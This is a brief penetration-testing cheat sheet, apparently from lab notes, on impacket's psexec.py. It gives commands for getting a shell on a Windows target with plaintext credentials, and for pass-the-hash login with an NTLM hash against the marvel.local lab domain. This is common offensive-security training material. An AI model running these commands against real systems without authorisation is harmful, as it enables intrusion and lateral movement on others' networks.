**This tool is part of impacket suite.**
```python
python3 /usr/share/doc/python3-impacket/examples/psexec.py --help
```
or

```bash
wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/psexec.py
```

#### Shell with psexec.py
When we have valid credentials, we can simply login to target.
```python
psexec.py marvel.local/fcastle:Password1@$TARGET
```

#### Passing the hash
When we have username and hash, we can login to target.
```python
psexec.py marvel.local/fcastle@192.168.111.138 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
```
